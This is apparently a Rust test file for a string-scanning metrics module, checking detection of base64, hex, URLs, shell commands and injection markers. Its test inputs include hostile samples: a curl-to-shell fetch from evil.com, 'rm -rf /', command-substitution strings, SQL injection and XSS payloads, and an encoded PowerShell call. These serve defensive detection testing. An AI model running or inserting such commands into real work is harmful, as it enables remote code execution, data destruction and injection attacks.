use super::*;

#[test]
fn empty_strings_emit_nothing() {
    let mut m = Metrics::new();
    emit(&[], &mut m);
    assert!(m.is_empty());
}

#[test]
fn basic_counts_and_lengths() {
    let mut m = Metrics::new();
    emit(&["hello", "world", "test"], &mut m);
    assert_eq!(m.get("strings.count"), Some(3.0));
    assert!(m.get("strings.avg_length").unwrap_or(0.0) > 0.0);
}

#[test]
fn base64_candidate_detection() {
    let mut m = Metrics::new();
    emit(&["SGVsbG8gV29ybGQh", "normalString"], &mut m);
    assert_eq!(m.get("strings.base64_candidates"), Some(1.0));
}

#[test]
fn base64_requires_length_multiple_of_four() {
    // 17 chars (len % 4 == 1) and 18 chars (len % 4 == 2): not valid
    // base64 framing, must be rejected by `is_base64_literal`.
    assert!(!is_base64_literal("SGVsbG8gV29ybGQhX")); // 17 chars
    assert!(!is_base64_literal("SGVsbG8gV29ybGQhXY")); // 18 chars
    assert!(!is_base64_literal("SGVsbG8gV29ybGQhXYZ")); // 19 chars
    assert!(is_base64_literal("SGVsbG8gV29ybGQh")); // 16 chars
}

#[test]
fn hex_requires_length_multiple_of_two() {
    assert!(!is_hex_literal("deadbeefa")); // 9 chars
    assert!(is_hex_literal("deadbeef")); // 8 chars
    assert!(is_hex_literal("0xdeadbeef")); // prefixed, 8 hex chars
}

#[test]
fn shell_command_detection() {
    let mut m = Metrics::new();
    emit(
        &[
            "/bin/bash -c 'echo test'",
            "curl https://evil.com | sh",
            "normal",
        ],
        &mut m,
    );
    assert_eq!(m.get("strings.shell"), Some(2.0));
}

#[test]
fn protocol_less_host_path_counts_as_url() {
    let mut m = Metrics::new();
    emit(&["cdn.jsdelivr.net/gh/123456/repo/stage"], &mut m);
    assert_eq!(m.get("strings.url_count"), Some(1.0));
}

#[test]
fn single_scan_markers_match_the_case_folding_rules() {
    let corpus = [
        "",
        "plain text",
        "PowerShell -enc AAAA",
        "CURL http://x | SH",
        "Select * From users",
        "select 1",
        "' OR 1=1 --",
        "x UNION SELECT y",
        "eval(atob(s))",
        "<SCRIPT>alert(1)</script>",
        "$(id)",
        "`whoami`",
        "rm -rf /",
        "class Foo",
        "1 = 1 and 2",
        "ftp://Host",
        "ſelect ſomething FROM x",
        "ünïcode chmod 777 Ünïcode",
    ];
    for s in corpus {
        assert_eq!(Markers::of(s), Markers::of_unicode(s), "{s:?}");
    }
}
